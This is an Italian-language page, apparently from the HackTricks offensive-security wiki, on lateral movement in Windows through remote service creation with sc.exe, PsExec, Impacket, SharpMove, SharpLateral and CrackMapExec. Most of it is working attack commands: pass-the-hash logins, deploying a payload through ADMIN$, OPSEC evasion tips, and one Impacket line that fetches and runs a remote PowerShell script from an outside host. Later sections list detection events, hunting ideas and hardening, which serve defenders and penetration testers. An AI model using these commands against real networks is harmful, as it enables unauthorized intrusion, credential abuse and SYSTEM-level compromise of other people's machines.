# Remote Service Execution (PsExec, WinExec, ScExec, SMBExec, SCMExec)

{{#include ../../banners/hacktricks-training.md}}

## Come funzionano

Queste tecniche abusano di Windows Service Control Manager (SCM) da remoto tramite SMB/RPC per eseguire comandi su un host target. Service Control Manager Remote Protocol (SCMR) è l’interfaccia basata su RPC per configurare e controllare i servizi Windows su un computer remoto. Con autorizzazioni sufficienti, un operatore può creare o riconfigurare un servizio il cui percorso binario contiene un comando e poi avviare il servizio per eseguirlo da remoto.<sup>[[5]](#references)</sup> Il flusso comune è:

1. Autenticarsi sul target tramite SMB/RPC (TCP/445); accedere alla condivisione ADMIN$ quando la variante scelta deve depositarvi un file o recuperare l’output.
2. Copiare un eseguibile o specificare una riga di comando LOLBAS che il servizio eseguirà.
3. Creare un servizio da remoto tramite SCM (MS-SCMR su \PIPE\svcctl) che punti al comando o al binario.
4. Avviare il servizio per eseguire il payload e, facoltativamente, acquisire stdin/stdout tramite una named pipe.
5. Arrestare il servizio e ripulire (eliminare il servizio e gli eventuali binari depositati).

Requisiti/prerequisiti:
- Amministratore locale sul target (SeCreateServicePrivilege) o autorizzazioni esplicite per la creazione di servizi sul target.
- SMB (445) raggiungibile e Remote Service Management consentito dal firewall dell’host; ADMIN$ deve essere disponibile per le varianti che lo usano per depositare un file o recuperare l’output.
- UAC Remote Restrictions: con gli account locali, il filtraggio dei token può bloccare l’accesso di un amministratore tramite rete, a meno che non si usi l’account Administrator predefinito o LocalAccountTokenFilterPolicy=1.
- Kerberos vs NTLM: l’uso di un hostname/FQDN abilita Kerberos; la connessione tramite IP spesso comporta il fallback a NTLM (che può essere bloccato negli ambienti con configurazioni di sicurezza rafforzate).

Se non viene specificato un account di servizio, `CreateService` usa `LocalSystem`, che dispone di ampi privilegi locali. Questo spiega l’impatto elevato di un’esecuzione SCM riuscita. Non disabilita automaticamente UAC o Microsoft Defender: il chiamante deve comunque disporre delle autorizzazioni SCM remote e i controlli sugli endpoint possono ispezionare o bloccare il servizio o il payload.<sup>[[7]](#references)</sup><sup>[[8]](#references)</sup>

### ScExec/WinExec manuale tramite sc.exe

Di seguito è illustrato un approccio minimale per la creazione di un servizio. Il percorso dell’immagine del servizio può puntare a un EXE depositato oppure a un LOLBAS come cmd.exe o powershell.exe.

```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```

Note:
- Aspettati un errore di timeout quando avvii un EXE non di servizio; l'esecuzione avviene comunque.
- Per essere più rispettosi dell'OPSEC, preferisci comandi fileless (`cmd /c`, `powershell -enc`) oppure elimina gli artefatti scaricati.

Trovi passaggi più dettagliati qui: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Tooling ed esempi

### Sysinternals PsExec.exe

- Classico strumento di amministrazione che usa SMB per copiare PSEXESVC.exe in ADMIN$, installa un servizio temporaneo (nome predefinito PSEXESVC) e inoltra l'I/O tramite named pipe.
- Esempi d'uso:<sup>[[1]](#references)</sup>

```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```

- Puoi avviare direttamente da Sysinternals Live tramite WebDAV:

```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```

OPSEC
- Lascia eventi di installazione/disinstallazione del servizio (il nome del servizio è spesso PSEXESVC, a meno che non venga usato -r) e crea C:\Windows\PSEXESVC.exe durante l'esecuzione.

### Impacket psexec.py (simile a PsExec)

- Usa un servizio simile a RemCom integrato. Deposita un binario di servizio temporaneo (di solito con nome casuale) tramite ADMIN$, crea un servizio (spesso RemComSvc per impostazione predefinita) e inoltra l'I/O tramite una named pipe.

```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```

Su Kali, gli esempi di Impacket potrebbero trovarsi in `/usr/share/doc/python3-impacket/examples/`. Se non viene fornita una password, lo strumento la richiede. L’opzione `-k` di Impacket richiede l’autenticazione Kerberos anziché NTLM, di solito usando la cache delle credenziali corrente o le credenziali fornite.

```bash
#If no password is provided, it will be prompted
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p '<password>' # Sysinternals PsExec password authentication
```

Artefatti
- EXE temporaneo in C:\Windows\ (8 caratteri casuali). Il nome del servizio è RemComSvc per impostazione predefinita, a meno che non venga sovrascritto.

### Impacket smbexec.py (SMBExec)

- Crea un servizio temporaneo che avvia cmd.exe e usa una named pipe per l’I/O. In genere evita di depositare un payload EXE completo; l’esecuzione dei comandi è semi-interattiva.

```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```

### SharpLateral and SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) implementa diversi metodi di lateral movement, incluso l'exec basato sui servizi.

```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```

- [SharpMove](https://github.com/0xthirteen/SharpMove) supporta l'esecuzione remota autenticata tramite SCM e diversi altri meccanismi Windows, tra cui la modifica/creazione di servizi.

```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```

- Puoi anche usare CrackMapExec per eseguire comandi tramite diversi backend (psexec/smbexec/wmiexec):

```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```

#### SCMExec with SharpMove

L’azione SCM crea un servizio denominato `WindowsDebug` e lo punta a un payload già presente sull’host remoto.<sup>[[6]](#references)</sup>

```powershell
SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true
```

## OPSEC, rilevamento e artefatti

Artefatti tipici su host/rete quando si usano tecniche simili a PsExec:
- Eventi Security 4624 (Logon Type 3) e 4672 (Special Privileges) sul target per l'account admin utilizzato.
- Eventi Security 5140/5145 File Share e File Share Detailed che mostrano l'accesso ad ADMIN$ e la creazione/scrittura di binari di servizio (ad es., PSEXESVC.exe o un .exe casuale di 8 caratteri).
- **System** 7045 dal Service Control Manager per l'installazione di un servizio sul target: nomi come PSEXESVC, RemComSvc o personalizzati (`-r` / `-service-name`). Questo prova che un servizio è stato installato, non che la sua immagine sia stata eseguita. Correlate il timestamp e il percorso dell'immagine con gli eventi di processo o, quando disponibile, con una voce prefetch corrispondente all'immagine del servizio.<sup>[[4]](#references)</sup>
- Sysmon 1 (Process Create) per services.exe o per l'immagine del servizio, 3 (Network Connect), 11 (File Create) in C:\Windows\, 17/18 (Pipe Created/Connected) per pipe come \\.\pipe\psexesvc, \\.\pipe\remcom_* o equivalenti randomizzati.
- Artefatto nel registro per l'EULA di Sysinternals: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 sull'host dell'operatore (se non soppresso).

Idee per la ricerca
- Generare un alert sulle installazioni di servizi il cui ImagePath include cmd.exe /c, powershell.exe o percorsi TEMP.
- Cercare la creazione di processi in cui ParentImage è C:\Windows\PSEXESVC.exe o processi figli di services.exe eseguiti come LOCAL SYSTEM che avviano shell.
- Segnalare le named pipe che terminano con -stdin/-stdout/-stderr o i nomi di pipe noti dei cloni di PsExec.

## Risoluzione dei problemi più comuni
- Accesso negato (5) durante la creazione di servizi: l'utente non è effettivamente admin locale, sono attive le restrizioni UAC remote per gli account locali oppure la protezione antimanomissione dell'EDR interviene sul percorso del binario del servizio.
- Percorso di rete non trovato (53) o impossibile connettersi ad ADMIN$: SMB/RPC bloccato dal firewall o condivisioni amministrative disabilitate.
- Kerberos non funziona ma NTLM è bloccato: connettersi usando il nome host/FQDN (non l'IP), verificare gli SPN oppure, con Impacket, fornire `-k`/`-no-pass` insieme ai ticket.
- L'avvio del servizio va in timeout ma il payload è stato eseguito: è previsto se non si tratta di un vero binario di servizio; acquisire l'output in un file oppure usare smbexec per l'I/O in tempo reale.

## Note di hardening
- Windows 11 24H2 e Windows Server 2025 richiedono la firma SMB per impostazione predefinita per le connessioni in uscita (e in ingresso per Windows 11). Questo non interrompe l'uso legittimo di PsExec con credenziali valide, ma impedisce gli abusi di SMB relay senza firma e può avere impatto sui dispositivi che non supportano la firma.<sup>[[2]](#references)</sup>
- Il nuovo blocco NTLM del client SMB (Windows 11 24H2/Server 2025) può impedire il fallback a NTLM quando ci si connette tramite IP o a server non Kerberos. Negli ambienti con hardening, questo interromperà PsExec/SMBExec basati su NTLM; usare Kerberos (nome host/FQDN) o configurare eccezioni se necessario per motivi legittimi.<sup>[[2]](#references)</sup>
- Principio del privilegio minimo: ridurre al minimo l'appartenenza al gruppo admin locale, preferire Just-in-Time/Just-Enough Admin, applicare LAPS e monitorare/generare alert sulle installazioni di servizi 7045.

## Vedi anche

- Esecuzione remota basata su WMI (spesso più fileless):

{{#ref}}
./wmiexec.md
{{#endref}}

- Esecuzione remota basata su WinRM:

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [Hardening della sicurezza SMB in Windows Server 2025 e Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Usare le credenziali per compromettere i sistemi Windows - Parte 2 (PSExec e servizi)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [4] [Microsoft – Risolvere i riavvii imprevisti usando i log eventi di sistema](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs)
- [5] [Specifiche aperte Microsoft - Panoramica del protocollo remoto Service Control Manager](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/d5bd5712-fa64-44bf-9433-3651f6a5ce97)
- [6] [GitHub - SharpMove](https://github.com/0xthirteen/SharpMove)
- [7] [Microsoft Learn - Account LocalSystem](https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account)
- [8] [Microsoft Learn - Funzione `CreateService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
{{#include ../../banners/hacktricks-training.md}}
